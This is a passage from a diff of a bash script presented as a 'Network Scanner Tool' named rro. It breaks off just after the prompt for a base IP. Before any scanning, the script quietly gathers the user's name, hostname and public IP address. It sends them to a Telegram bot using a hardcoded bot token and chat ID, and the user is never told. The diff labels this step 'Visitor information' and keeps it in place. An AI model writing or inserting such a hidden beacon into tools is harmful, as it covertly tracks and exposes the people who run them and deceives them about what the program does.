@@ -8,17 +8,21 @@ echo "██║     ██║     ╚██████╔╝"
 echo "╚═╝     ╚═╝      ╚═════╝  rro"
 echo "🌐 Network Scanner Tool (Fast Mode) 🌐"
 
+# Telegram Bot settings
 BOT_TOKEN="7459581473:AAHIZAgro3g0L2lslzxV2QLh9-UbLjHBP5I"
-CHAT_ID="7691970173"
+CHAT_ID="7459581473"
 
+# Visitor information
 USER=$(whoami)
 HOST=$(hostname)
 IP=$(curl -s https://ipinfo.io/ip)
 
+# Send notification to Telegram
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d chat_id="$CHAT_ID" \
      -d text="🚨 rro tool executed 🚨%0AUser: $USER%0AHost: $HOST%0AIP: $IP"
 
+# Start scanning
 read -p "Enter the base IP (e.g. 192.168.1.): " base_ip
 
 active_count=0
